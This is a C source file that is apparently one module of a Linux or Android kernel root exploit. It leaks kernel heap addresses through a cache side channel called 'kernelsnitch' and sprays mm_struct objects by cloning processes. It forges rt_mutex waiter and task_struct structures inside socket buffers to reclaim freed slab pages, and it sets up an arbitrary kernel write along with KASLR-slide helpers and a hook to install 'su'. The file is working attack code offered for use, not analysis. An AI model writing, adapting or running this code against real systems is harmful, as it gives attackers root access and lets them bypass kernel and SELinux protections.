#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_custom_shape;
int direct_root_cpu = -1;

static cpu_set_t initial_affinity;
static int initial_affinity_valid;

static int read_sysfs_u64(const char *path, uint64_t *out) {
  char buf[64];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  buf[n] = 0;

  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(buf, &end, 10);
  if (errno || end == buf) {
    return 0;
  }
  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
    end++;
  }
  if (*end) {
    return 0;
  }
  *out = (uint64_t)value;
  return 1;
}

int init_direct_root_cpu(void) {
  if (sched_getaffinity(0, sizeof(initial_affinity), &initial_affinity) != 0) {
    return 0;
  }
  initial_affinity_valid = 1;

  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured <= 0 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  int best = -1;
  int fallback = -1;
  uint64_t best_freq = 0;
  uint64_t best_capacity = 0;
  for (int cpu = 0; cpu < configured; cpu++) {
    if (!CPU_ISSET(cpu, &initial_affinity)) {
      continue;
    }

    char path[160];
    uint64_t online = 1;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/online", cpu);
    if (read_sysfs_u64(path, &online) && online != 1) {
      continue;
    }
    fallback = cpu;

    uint64_t freq = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
    if (!read_sysfs_u64(path, &freq)) {
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
      if (!read_sysfs_u64(path, &freq)) {
        continue;
      }
    }

    uint64_t capacity = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
    (void)read_sysfs_u64(path, &capacity);

    if (best < 0 || freq > best_freq ||
        (freq == best_freq && capacity > best_capacity) ||
        (freq == best_freq && capacity == best_capacity && cpu > best)) {
      best = cpu;
      best_freq = freq;
      best_capacity = capacity;
    }
  }

  if (best < 0) {
    int current = sched_getcpu();
    if (current >= 0 && current < CPU_SETSIZE &&
        CPU_ISSET(current, &initial_affinity)) {
      best = current;
    } else {
      best = fallback;
    }
    if (best >= 0) {
      pr_warning("CPU max frequency unavailable; fallback cpu=%d\n", best);
    }
  }
  if (best < 0) {
    errno = ENODEV;
    return 0;
  }

  direct_root_cpu = best;
  pr_success("runtime performance cpu=%d max_freq=%llu capacity=%llu\n",
             best, (unsigned long long)best_freq,
             (unsigned long long)best_capacity);
  return 1;
}

int restore_initial_affinity(void) {
  if (!initial_affinity_valid) {
    errno = EINVAL;
    return 0;
  }
  return sched_setaffinity(
      0, sizeof(initial_affinity), &initial_affinity) == 0;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("startup pid=%d uid=%u attr=%s enforce=%s direct_cpu=%d\n",
             getpid(), getuid(), attr, enforce, direct_root_cpu);
}

void log_slide_child_context(void) {
  pr_success("slide child pid=%d uid=%u direct_cpu=%d\n",
             getpid(), getuid(), direct_root_cpu);
}

void disable_rseq_for_thread(void) {
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}

uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}

int pselect_write_shape(void) {
  return pselect_custom_shape;
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_shape = shape;
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

static pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    pin_to_core((size_t)direct_root_cpu);
    kernelsnitch_find_collisions(ks);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY | O_CLOEXEC));
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

static void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

static void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->memfds);
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

static int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

static void init_ctx(struct mm_ctx *ctx, size_t count) {
  ctx->mm_cnt = count;
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->memfds) {
    pr_error("mm context allocation failed count=%zu\n", count);
  }
  for (size_t i = 0; i < count; i++) {
    ctx->memfds[i] = -1;
  }
}

static void prepare_ctxs(void) {
  init_ctx(&prepare_ctx, 8 * mm_objs_per_slab);
  init_ctx(&spray_ctx, (1 + MM_PARTIALS) * mm_objs_per_slab);
  init_ctx(&pre_ctx, mm_objs_per_slab - 1);
  init_ctx(&post_ctx, mm_objs_per_slab);
}

static void put_direct_waiter(
    unsigned char *p, uintptr_t parent, uintptr_t right,
    uintptr_t left, uint64_t waiter_task) {
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x00, 1);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 0);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 0);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, parent);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, right);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, left);
  put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
  put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
  put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
  put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
  put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  if (payload_mode != PAGE_PAYLOAD_SLIDE &&
      payload_mode != PAGE_PAYLOAD_FOPS) {
    return 0;
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;

  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  uint64_t waiter_task;
  uint64_t task_group;
  uint64_t pi_top_task;

  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    parent = SLIDE_LOGGERS_0_1;
    right = 0;
    left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  } else {
    parent = pselect_custom_value;
    right = 0;
    left = pselect_custom_target;
    if (pselect_custom_shape == 1) {
      if (pselect_custom_target < 8) {
        return 0;
      }
      parent = pselect_custom_target - 8;
      right = pselect_custom_value;
      left = 0;
    }
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_direct_waiter(p, parent, right, left, waiter_task);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
  }
  return 1;
}

static uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_error("skb payload allocation failed\n");
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.memfds[i] = clone_memfd();
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  uintptr_t slab_off = leaked - base;
  size_t leaked_slot = slab_off / MM_STRUCT_SZ;
  if (slab_off % MM_STRUCT_SZ != 0 || leaked_slot >= mm_objs_per_slab ||
      !prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
  }

  int shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  struct iovec iov = {
    .iov_base = skb_buf,
    .iov_len = SKB_RECLAIM_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  if (sendmsg(shaping_sv[0], &msg, 0) != (ssize_t)SKB_RECLAIM_SIZE) {
    close(shaping_sv[0]);
    close(shaping_sv[1]);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close_ctx_memfds(&pre_ctx);
  for (size_t i = 0; i + 1 < post_ctx.mm_cnt; i++) {
    close(post_ctx.memfds[i]);
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }

  close(shaping_sv[0]);
  close(shaping_sv[1]);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close(leak_memfd);

  int reclaim_ok = 1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) !=
        (ssize_t)SKB_RECLAIM_SIZE) {
      reclaim_ok = 0;
      break;
    }
  }

  kernelsnitch_cleanup(ks);
  ks = NULL;
  close_ctx_memfds(&prepare_ctx);
  if (!reclaim_ok) {
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = payload_mode == PAGE_PAYLOAD_SLIDE ?
      SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("kernel page retry %d/%d mode=%d\n",
               attempt, max_attempts, payload_mode);
  }
  return 0;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}
